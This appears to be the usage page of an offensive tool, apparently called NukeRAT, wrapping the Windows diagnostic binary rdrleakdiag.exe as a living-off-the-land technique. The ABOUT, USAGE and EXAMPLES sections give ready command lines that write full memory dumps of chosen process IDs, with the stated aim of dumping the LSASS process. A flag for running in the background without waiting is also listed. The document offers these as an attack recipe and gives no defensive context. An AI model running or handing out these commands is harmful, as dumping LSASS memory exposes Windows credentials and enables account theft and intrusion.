ABOUT
    Microsoft Windows resource leak diagnostic tool. LOLBAS covers
    dump process by PID, dump LSASS process, and related techniques.

USAGE:
    rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
    rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
    rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap

EXAMPLES:
    rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
    rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
    rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1
